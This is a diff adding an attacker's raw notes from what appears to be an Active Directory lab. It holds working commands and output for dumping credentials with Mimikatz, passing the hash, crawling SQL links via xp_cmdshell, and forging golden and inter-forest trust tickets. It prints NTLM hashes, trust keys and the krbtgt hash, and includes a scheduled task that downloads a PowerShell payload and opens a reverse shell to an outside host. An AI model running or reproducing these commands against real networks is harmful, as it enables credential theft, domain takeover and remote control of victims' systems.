@@ -1,0 +1,225 @@
+Grab cache credentials
+
+Invoke-Mimikatz -Command 'privilege::debug'
+Invoke-Mimikatz -Command 'token::elevate'
+Invoke-Mimikatz -Command 'lsadump::cache'
+
+===============================================
+
+
+appadmin
+d549831a955fee51a43c83efb3928fa7
+
+srvadmin
+Logon Server      : DCORP-DC
+a98e18228819e8eec3dfa33cb68b0728
+
+
+websvc
+Logon Server      : DCORP-DC
+cc098f204c5887eaa8253e7c2749156f
+
+
+svcadmin
+b38ff50264b74508085d82c69794a4d8
+
+
+PS C:\AD\Tools> Get-NetGroupMember -GroupName 'Domain Admins'
+
+
+GroupDomain  : dollarcorp.moneycorp.local
+GroupName    : Domain Admins
+MemberDomain : dollarcorp.moneycorp.local
+MemberName   : svcadmin
+MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1122
+IsGroup      : False
+MemberDN     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+
+GroupDomain  : dollarcorp.moneycorp.local
+GroupName    : Domain Admins
+MemberDomain : dollarcorp.moneycorp.local
+MemberName   : Administrator
+MemberSID    : S-1-5-21-1874506631-3219952063-538504511-500
+IsGroup      : False
+MemberDN     : CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+
+
+
+mimikatz(powershell) # lsadump::lsa /patch
+Domain : DCORP-ADMINSRV / S-1-5-21-3626693251-3967052197-1524620807
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : 2c0bba089d2d62e4d8911fc2fcc0c2e2
+
+
+
+mimikatz(powershell) # lsadump::lsa /patch
+Domain : DCORP-MGMT / S-1-5-21-2765387493-2672277587-2490794481
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : cda7ba90f97db93107a190469cd3201b
+
+
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /ntlm:a98e18228819e8eec3dfa33cb68b0728 /domain:dollarcorp.moneycorp.local /run:powershell.exe"'
+
+
+. .\PowerView.ps1
+PS C:\AD\Tools> Find-LocalAdminAccess
+dcorp-std139.dollarcorp.moneycorp.local
+dcorp-mgmt.dollarcorp.moneycorp.local
+dcorp-adminsrv.dollarcorp.moneycorp.local
+
+
+
+
+
+
+
+SQL Enumeration
+
+ . .\PowerUpSQL.ps1
+
+Get-SQlInstanceDomain
+Get-SQLInstanceDomain  | Get-SQLConnectionTestThreaded
+Get-SQLInstanceDomain  | Get-SQLServerInfo -verbose
+Get-SQlServerlink -Instance <user/machine> -verbose
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -query "exec master..xp_cmdshell 'whoami'" | ft
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -query "exec master..xp_cmdshell 'whoami'" | ft
+
+
+
+=======================================================================
+Domain Admin escalate to Enterprise Admin using trustkey
+========================================================================
+Dump TrustKey 
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+
+
+
+Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-1874506631-3219952063-538504511)
+
+Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
+    * 11/14/2020 1:03:09 PM - CLEAR   - 6b 89 13 1b 7b e6 aa 08 4e a7 05 91 c3 cd 8b d7 dc 8f df a5 92 d0 12 26 ad d9 eb e3 65 f0 e8 d3 7d 35 a3 41 ae 01 5e d3 ad 12 90 8c fe de d0 d1 36
+ 59 fb cf 89 ee 76 9d 91 b2 07 d7 30 93 30 79 2c 1b 4e de bf 9c b5 83 e0 2d 34 d4 a4 f9 89 15 6b b5 3f 4e ae ce 28 43 1e d5 a7 a0 6f 0c aa 6d eb 1c 64 c3 81 04 a4 87 37 18 a2 50 6f 25 15
+ 4c 5b ac 25 99 47 99 7e 5b c9 37 f5 35 a2 8c 5e 4c ae 22 84 63 68 ca ad 2c 5f fc e1 8e 2f 17 25 30 0a 7d 27 03 db a8 d3 87 e5 6c 06 33 de 1c 03 ab a2 5e bb f7 9b 6e 2a b8 c8 4c 89 8a be
+ 4d 44 00 c9 d8 41 ec e4 55 a5 a3 bc e2 3f fb 22 82 a2 cc c9 79 99 da b7 48 c6 ca 40 fa a3 df 66 3f ee df 2f b0 61 ad 69 56 81 3b ce ca 3f 5e 3a e4 5a 05 5d d5 00 42 e6 2a ce 64 c2 54 db
+ 52 2f 15 d2 22
+        * aes256_hmac       9d3c82c8e38341c141e95ad3c558372262c55e3f5160dcba216c08675de8d904
+        * aes128_hmac       aa5bdea3628fb991e41dca0c70125de0
+        * rc4_hmac_nt       51237f860037ad238e53b84e0a7f1b69
+
+
+ --------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
+    * 11/14/2020 1:02:29 PM - CLEAR   - f7 35 6f ab 1e 5d 25 b0 f4 39 86 18 cf a6 51 67 a4 71 5e 49 63 15 8b 11 71 a4 be d1 c0 25 f7 b9 d0 87 37 c2 b4 46 34 36 1b 7c b2 5c 76 eb 62 d5 b8
+ 90 20 d0 73 2e bd 10 3a 9d 0c ba d7 97 3b 78 b2 b8 6c ea 46 64 d2 77 58 27 90 e8 bd e5 25 ab 6c 60 84 dc 7f 8c 39 dc de 62 2b 22 49 d1 56 63 e7 65 8a ba 15 87 84 18 12 ba 40 8d 8a 5c 51
+ 2e ba eb e9 86 42 30 e7 47 af a9 a5 d5 43 70 18 84 d0 11 5f bc b3 5d 6e 65 b0 d1 fb 35 b1 0a a9 9f 61 f5 22 3c 29 1b 5c 28 e2 02 2a 89 55 18 f1 dc 01 d0 df 77 f5 c4 68 0b 55 4e 51 c2 d8
+ 00 49 0c e7 e1 f6 37 66 eb 5d d2 9a 05 55 32 f1 fc e1 12 1f 27 ce f3 1a 05 14 d8 84 54 81 df dd cd 5e 1b 4f d9 3e 43 48 16 64 c5 01 b7 72 27 75 2d 14 3b 9f df 21 c2 6c 46 05 d5 2f 24 99
+ a3 94 bc 62 4a
+        * aes256_hmac       dc2bee19cfd5d3e6584d45fe42324d796d42a7f9d20b16e3d2f8844a0b83ec4c
+        * aes128_hmac       1f0e5fbf6f5700968b9f83b30e498f57
+        * rc4_hmac_nt       4f347eb66d27c81647458830641a907b
+
+================================================================================================================================================
+
+
+PS C:\Users\svcadmin\Documents> Get-NetComputer -domain moneycorp.local
+mcorp-dc.moneycorp.local
+dcorp-stdadmin.moneycorp.local
+PS C:\Users\svcadmin\Documents> Get-NetComputer -domain eurocorp.local
+eurocorp-dc.eurocorp.local
+
+Cross Forest 
+
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:51237f860037ad238e53b84e0a7f1b69 /target:moneycorp.local /ticket:C:\Ad\Tools\here.kirbi"'
+.\asktgs.exe C:\AD\tools\here.kirbi HOST/mcorp-dc.moneycorp.local
+.\kirbikator.exe lsa .\HOST.mcorp-dc.moneycorp.local.kirbi
+PS C:\AD\Tools> klist
+
+Current LogonId is 0:0x384cb16
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ dollarcorp.moneycorp.local
+        Server: HOST/mcorp-dc.moneycorp.local @ MONEYCORP.LOCAL
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 11/15/2020 0:39:56 (local)
+        End Time:   11/15/2020 10:39:56 (local)
+        Renew Time: 11/22/2020 0:39:56 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called:
+PS C:\AD\Tools> schtasks /S mcorp-dc.moneycorp.local
+
+Folder: \
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+CreateExplorerShellUnelevatedTask        N/A                    Running
+
+<snip>
+
+
+
+schtasks /S mcorp-dc.moneycorp.local
+
+
+schtasks /CREATE /S mcorp-dc.moneycorp.local /SC weekly /RU "NT Authority\SYSTEM" /TN "Task1" /TR "powershell.exe iex (iwr http://172.16.100.139/Invoke-PowerShellTcp.ps1 -useBasicParsing);Power -Reverse -IPAddress 172.16.100.139 -Port 8888"
+SUCCESS: The scheduled task "Task1" has successfully been created.
+
+
+schtasks /run /s mcorp-dc.moneycorp.local /TN "Task1"
+SUCCESS: Attempted to run the scheduled task "Task1".
+
+
+
+
+=======================================================================
+Domain Admin escalate to Enterprise Admin using krbtgt
+========================================================================
+invoke-mimikatz -command '"lsadump::lsa /patch"'
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : ff46a9d8bd66c6efd77603da26796f35
+
+PS C:\Ad\Tools> Invoke-Mimikatz -command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700
+767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /target:moneycorp.local /ticket:C:\AD\Tools\There.kirbi"' 
+
+
+
+=========================================================================================================================================
+
+
+
+Cross External Forest
+
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /target:eurocorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-1652071801-1423090587-98612180 /rc4:4f347eb66d27c81647458830641a907b /ticket:C:\AD\Tools\Tmp.kirbi"'
+.\asktgs.exe C:\AD\Tools\Tmp.kirbi CIFS/eurocorp-dc.eurocorp.local
+.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
+
+
+PS C:\Ad\Tools> ls //eurocorp-dc.eurocorp.local\sharedwithDCorp\
+
+
+    Directory: \\eurocorp-dc.eurocorp.local\sharedwithDCorp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        2/18/2019   3:18 AM             29 secret.txt
+
+
+PS C:\Ad\Tools> cat //eurocorp-dc.eurocorp.local\sharedwithDCorp\secret.txt
+Dollarcorp DAs can read this!
+
+
